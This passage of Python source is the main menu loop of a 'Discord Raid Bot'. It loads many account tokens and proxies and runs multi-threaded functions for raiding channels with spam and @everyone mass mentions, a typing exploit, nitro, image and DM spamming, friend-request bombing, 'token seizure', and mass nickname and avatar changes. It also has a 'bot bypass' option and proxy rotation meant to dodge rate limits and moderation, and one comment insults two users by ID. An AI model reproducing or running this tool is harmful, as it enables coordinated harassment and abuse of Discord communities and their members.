    unverifiedtokens = []
    phonelocked = []

    channelidtotype = ""

    totaljoined = 0

    with open(tokenfile, 'r') as tokenss:
        for tok in tokenss:
            tokenlist.append(tok)
            tokencount += 1
    if config['proxylist']:
        print(Style.BRIGHT + Fore.RED + " [!] " + Style.RESET_ALL + Fore.RESET + Fore.GREEN +
              " Proxies Used " + Fore.RESET + Style.BRIGHT + Fore.RED + "[!] " + Fore.RESET + Style.RESET_ALL)

        with open(config['proxylist'], 'r') as proxiesxyz:
            for _ in proxiesxyz:

                proxycount += 1
        os.system(
            f"title Discord Raid Bot  [Tokens Loaded: {tokencount}] [Proxies Loaded: {proxycount}]")
    else:
        print(
            Fore.RED + " [!] No Proxy file entered.\nProxyless Version Used [!]" + Fore.RESET)
        os.system(f"title Discord Raid Bot  [Tokens Loaded: {tokencount}] ")
    tokens = open(tokenfile, 'r').read().splitlines()
    proxies = open(config['proxylist'], 'r').read().splitlines()
    proxies = [{'https': 'http://'+proxy} for proxy in proxies]
    
    while True:
        choice = int(input(
            Style.BRIGHT + "\n [1]  Joiner\n [2]  Raider\n [3]  Token Checker\n [4]  Server Leaver\n [5]  Tyipng Exploit\n [6]  Proxy Scrapper(HTTP/S)\n [7]  Proxy Checker\n [8]  Remove Dulpicates\n [9]  Nitro Spam\n [10] Token Seziure\n [11] Mass Reactor\n [12] Image Spammer\n [13] DM Spammer\n [14] Friend Bomber(Ratelimit)\n [15] Friend RevBomber(Ratelimit)\n [16] Nickname Changer\n [17] Mass pfp Changer\n >>> " + Style.RESET_ALL))
        uselessvar = 0
        # messagessent = 0
        
        if choice == 1:
            while uselessvar == 0:
                usethreading = 0

                invitelink = str(input("Enter the invite link to the server: "))
                usethreading = int(input("Do you want to use Threading?\n1.Yes\n2.No :"))
                if usethreading == 1 or usethreading == 2:
                    regex = re.match(r'(https:\/\/discord.gg\/)([a-zA-Z0-9]+)', invitelink)
                    if regex:
                        invitelink = str(regex.group()).split("/")[3]

                    

                    if usethreading == 1:
                        num = 0
                        while num < 20:
                            num += 1
                            # print("Number of threads Active: ",threading.active_count())
                            threading.Thread(target=joiner).start()
                    else:
                        joiner()
                    uselessvar == 1

                else:
                    print("Invalid Option Selected. Please choose one!")

        if choice == 2:

            channelid = str(input("Please Enter Channel id : "))
            messagetosend = str(input("Please input Message to Send: "))
            appendascii = 0
            try:
                bypass = int(input(
                    "Do you want to add Bot bypass by adding random 2 digits?(Default = No)\n1.Yes 2.No :"))
            except:
                bypass = 0

            if bypass == 1:
                pass# messagetosend = messagetosend + str(random.randint(10, 99))
            else:
                bypass = 0

            try:
                threads = int(
                    input("Please input number of threads to use(Default = 10): "))
            except:
                threads = 10

            try:
                tagpeople = int(
                    input("Do you want to @TAG people?(Default = No)\n1.Yes 2.No :"))
            except:
                tagpeople = 0
            if tagpeople == 1:
                messagetosend = messagetosend + " @everyone" + " @here "

            try:
                appendascii = int(input(
                    "Do you want to append random Ascii to the Message?(Default = No)\n1.Yes 2.No :"))
            except:
                appendascii = 0
            try:
                appendrepeat = int(input(
                    "Do you want to append repeated message?(Default = No)\n1.Yes 2.No :"))
            except:
                appendrepeat = 0    

            if appendrepeat == 1:
                messagetosend = messagetosend + " "
                curlen = len(messagetosend)
                lentosend = 1999-curlen-3
                mathlol = int(lentosend/curlen)
                messagetosend = messagetosend * mathlol
            #   <@728357188879253654> <@550713111972413455> YOU BOTH CAN GO FUCK YOURSELF IMAGINE SPAMMING SKID SERVER

            massmention = int(input(" Mass Mention? \n [1] YES\n [2] NO\n >> "))
            if massmention == 1:
                serverid = input(" Enter the Server ID: ")
                req = requests.session()
                temptoken = random.choice(tokens)
                memberlist = []
                msg = ''
                try:
                    src = req.get(f"https://discord.com/api/v8/guilds/{serverid}/members?limit=1000",headers={"authorization":temptoken})
                except:
                    print(" [!] An Error Occured ")
                    break    
                memberjson = json.loads(src.content)
                for member in memberjson:
                    memberlist.append(f"<@{member['user']['id']}>")
                for member in memberlist:
                    msg += member + ' '
                num = 0
                while num < threads:
                    num += 1
                    # print("Number of threads Active: ",threading.active_count())
                    # Start Checking Thread
                    threading.Thread(target=massmentioner).start()          

            if not threads:
                threads = 10
            lentosend = 1999 - len(messagetosend)
            num = 0
            while num < threads:
                num += 1
                # print("Number of threads Active: ",threading.active_count())
                # Start Checking Thread
                threading.Thread(target=sendmessage).start()
                # sys.stdout.flush()
                # sys.stdout.write('\r')
        if choice == 3:
            # tokenfilename = input(" Enter the token file :")
            print("Checking Tokens...\n")
            # num = 0
            # while num < 20:
            # 	num += 1
            # 	# print("Number of threads Active: ",threading.active_count())
            # 	threading.Thread(target=tokenchecker).start()
            tokenchecker()
        if choice == 4:
            print("Leaving Server!")
            serverid = str(input("Enter the server id to leave :  "))
            leaver()
           
        if choice == 5:
            print("\n\tTyping Exploit!\n")
            channelidtotype = str(
                input("Enter the Channel ID to TYPING... :  "))
            num = 0
            while num < 70:
                num += 1
                threading.Thread(target=typer).start()
        if choice == 6:
            print("\n\t Proxy Scrapper in Progress...\n")
            proxyscrapper()
        if choice == 7:
            proxyfiletocheck = str(input("\n Enter the proxy file name\n >> "))
            sitetocheck = str(
                input("\nEnter the site to check proxies against [0 for google]\n >> "))
            if sitetocheck == str(0):
                sitetocheck = "http://google.com"

            # proxies_q, timestring
            data = [i.rstrip()
                    for i in open(proxyfiletocheck, 'r').readlines()]
            proxies = []
            THREADS = int(input("\n Enter Thread Amount\n >> "))
            TIMEOUT = int(input("Enter the Timeout in Seconds\n >> "))
            for _ in data:
                proxies.append(_)
            proxies_q = arrtoQ(proxies, proxies_q)
            tx = []
            timestring = "Working Proxies-" + \
                time.strftime("%m-%d  %H-%M")+".txt"
            for t in range(THREADS):
                mt = threading.Thread(target=worker)
                mt.start()
                tx.append(mt)
            for t in tx:
                t.join()
            yourchoice = int(input(
                ' Done!\nDo you want to Replace the Working proxies in the Main Proxy File\n [1] Yes\n [2] NO\n >>> '))
            if yourchoice == 1:
                f = open(config['proxylist'], 'w')
                for i in workingproxylist:
                    f.write(i+'\n')
                f.close()
                main()

        if choice == 8:
            removedup()

        if choice == 9:
            num = 0
            channelidtospam = input(" Channel ID to spam\n >> ")
            # nitroascii = int(input("Do you want to append ascii to nitor codes\n [1]  Yes\n [2]  NO\n >>>  "))
            THREADS = int(input(" Enter threads amount\n >> "))
            tx = []
            for t in range(THREADS):
                mt = threading.Thread(target=nitrospam)
                mt.start()
                tx.append(mt)
            for t in tx:
                t.join()
        if choice == 10:
            tokenseziure()

        if choice == 11:
           react()
        if choice == 12:
            channelid = input(" Channel ID to spam\n >> ")
            # nitroascii = int(input("Do you want to append ascii to nitor codes\n [1]  Yes\n [2]  NO\n >>>  "))
            folder = input(" Folder Name\n >> ")
            THREADS = int(input(" Enter threads amount\n >> "))
            tx = []
            for t in range(THREADS):
                mt = threading.Thread(target=imagespammer)
                mt.start()
                tx.append(mt)
            for t in tx:
                t.join()
        if choice == 13:
            print("DM Spammer")
            dmspammer()
        if choice == 14:
            print("Friend Bomber")
            userid = input(" Enter the User ID of the USER\n >> ")
            friendbomber()
        if choice == 15:
            print("Friend Request Deleter")
            userid = input(" Enter the User ID of the USER\n >> ")
            deletefriendbomber()
        if choice == 16:
            print("Nick-Name Changer")
            nnserverid = str(input("Enter the server ID: "))
            nnchanger()
        if choice == 17:
            print("MASS-Profile_Picture_Changer")
            def get_mime(data):
                if data.startswith(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'):
                    return 'image/png'
                elif data[6:10] in (b'JFIF', b'Exif'):
                    return 'image/jpeg'
                elif data.startswith((b'\x47\x49\x46\x38\x37\x61', b'\x47\x49\x46\x38\x39\x61')):
                    return 'image/gif'
                elif data.startswith(b'RIFF') and data[8:12] == b'WEBP':
                    return 'image/webp'
            def bytes_to_base64_data(data):
                fmt = 'data:{mime};base64,{data}'
                mime = get_mime(data)
                b64 = base64.b64encode(data).decode('ascii')
                return fmt.format(mime=mime, data=b64)

            for image in os.listdir('pics/'):
                filename =  'pics/' + str(os.fsdecode(image))
                if filename.endswith(".jpeg") or filename.endswith(".jpg") or filename.endswith(".png") or filename.endswith(".gif"):
                    with open(filename,'rb') as image_file:
                        encodedb64 = bytes_to_base64_data(image_file.read())
                        imagelist.append(encodedb64)
            pfpchanger()
            
if __name__ == '__main__':
    main()
